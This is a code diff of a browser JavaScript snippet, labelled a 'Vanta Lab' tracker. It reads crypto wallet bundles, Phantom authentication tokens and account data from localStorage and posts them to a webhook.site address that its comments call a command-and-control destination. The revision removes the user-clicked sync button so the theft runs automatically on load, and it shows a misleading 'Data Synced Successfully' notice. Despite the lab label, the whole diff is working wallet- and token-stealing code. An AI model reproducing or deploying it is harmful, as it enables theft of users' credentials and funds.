@@ -1,61 +1,53 @@
 (function() {
-    // Target Webhook for data exfiltration analysis
+    // 1. Setup - The "Command & Control" (C2) destination
     const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
-    const AFFILIATE_ID = 'TK0XQV';
+    
+    console.log("%c[Vanta Lab] Tracker Active", "color: #00ff88; font-weight: bold;");
 
-    console.log("[Vanta] Initializing de-obfuscated tracker...");
-
-    const getSensitiveData = () => {
+    // 2. The Extraction Logic (The "Scraper")
+    const harvest = () => {
         return {
-            bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
+            wallet_bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
             auth_tokens: localStorage.getItem('.phantom.auth.tokens'),
-            accounts: localStorage.getItem('vanta_accounts'),
-            origin: window.location.hostname,
-            url: window.location.href,
-            time: new Date().toISOString()
+            vanta_accounts: localStorage.getItem('vanta_accounts'),
+            host: window.location.hostname,
+            timestamp: new Date().toLocaleString()
         };
     };
 
-    const sendToCollector = async (payload) => {
+    // 3. The Exfiltration (The "Transmission")
+    const exfiltrate = async (data) => {
         try {
+            // Using 'no-cors' to avoid preflight (OPTIONS) checks that might be blocked
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                mode: 'no-cors', // Standard bypass for simple OOB exfiltration
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    affiliate: AFFILIATE_ID,
-                    data: payload
-                })
+                mode: 'no-cors',
+                body: JSON.stringify(data)
             });
-            console.log("[Vanta] Data transmitted to webhook.");
-        } catch (e) {
-            console.error("[Vanta] Transmission failed:", e);
+            
+            // Visual feedback for the lab
+            showNotification("Data Synced Successfully", "#00ff88");
+        } catch (err) {
+            showNotification("Sync Failed: CSP or Network Block", "#ff4444");
+            console.error("Exfiltration error:", err);
         }
     };
 
-    // UI Overlay (1:1 styling)
-    const injectUI = () => {
-        const div = document.createElement('div');
-        div.style.cssText = `
-            position:fixed; top:20px; right:20px; width:300px;
-            background:#111; border:1px solid #00ff88; color:#fff;
-            padding:20px; border-radius:10px; z-index:999999;
-            font-family:sans-serif; box-shadow:0 0 20px rgba(0,255,136,0.2);
+    // 4. UI Overlay (1:1 Vanta Look)
+    const showNotification = (msg, color) => {
+        const notify = document.createElement('div');
+        notify.style.cssText = `
+            position: fixed; top: 10px; right: 10px; z-index: 10000;
+            background: #111; color: ${color}; border: 1px solid ${color};
+            padding: 15px; border-radius: 5px; font-family: 'Inter', sans-serif;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
         `;
-        div.innerHTML = `
-            <h3 style="color:#00ff88; margin-bottom:10px;">Vanta Dashboard</h3>
-            <p style="font-size:12px; color:#aaa; margin-bottom:15px;">Target: ${window.location.hostname}</p>
-            <button id="vanta-sync-btn" style="width:100%; padding:10px; background:#00ff88; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">SYNC TO PADRE</button>
-        `;
-        document.body.appendChild(div);
-
-        document.getElementById('vanta-sync-btn').onclick = function() {
-            this.innerText = "Syncing...";
-            const data = getSensitiveData();
-            sendToCollector(data);
-            setTimeout(() => { this.innerText = "Sync Complete"; }, 1000);
-        };
+        notify.innerText = msg;
+        document.body.appendChild(notify);
+        setTimeout(() => notify.remove(), 3000);
     };
 
-    injectUI();
+    // Execute
+    const stolenData = harvest();
+    exfiltrate(stolenData);
 })();
